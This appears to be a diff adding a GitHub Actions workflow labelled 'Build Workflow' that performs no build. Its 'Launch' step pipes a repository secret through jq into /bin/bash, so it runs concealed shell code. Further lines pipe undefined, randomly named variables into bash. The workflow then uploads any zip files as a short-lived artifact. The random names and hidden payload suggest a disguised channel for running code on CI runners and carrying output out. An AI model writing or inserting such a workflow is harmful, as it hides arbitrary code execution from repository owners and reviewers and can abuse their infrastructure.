@@ -1,0 +1,29 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          nga2128: ${{ secrets.nga2128 }}
+        run: |
+          printf '%s' "$nga2128" | jq -r .c6522 | /bin/bash
+          printf '%s' "$fs134" | jq -r .kmytj473 | /bin/bash
+          printf '%s' "$is51" | jq -r .rqhs10485 | /bin/bash
+          printf '%s' "$cpia38751" | jq -r .jz98942 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: zcJViMfJ
+          path: "*.zip"
+          retention-days: 1
